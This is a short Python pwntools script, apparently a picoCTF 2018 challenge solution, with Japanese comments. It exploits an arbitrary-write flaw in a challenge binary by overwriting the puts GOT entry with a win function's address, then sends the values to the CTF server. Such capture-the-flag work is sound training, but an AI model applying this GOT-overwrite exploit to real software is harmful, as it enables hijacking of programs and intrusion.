from pwn import *

# 問題プログラムが任意のアドレスを書き換えてくれるので、putsのgotをwinに書き換え
# putsが呼ばれたときにwinが実行されるようにする

win_addr = 0x0804854b
b = ELF('./auth')

# p = process('./auth')
host = '2018shell3.picoctf.com'
port = 3582
p = remote(host, port)
print('Write to 0x%08x' % b.got['puts'])
print('Value 0x%08x' % win_addr)

p.recv(1048)
p.sendline('0x%08x' % b.got['puts'])
p.sendline('0x%08x' % win_addr)

p.interactive()
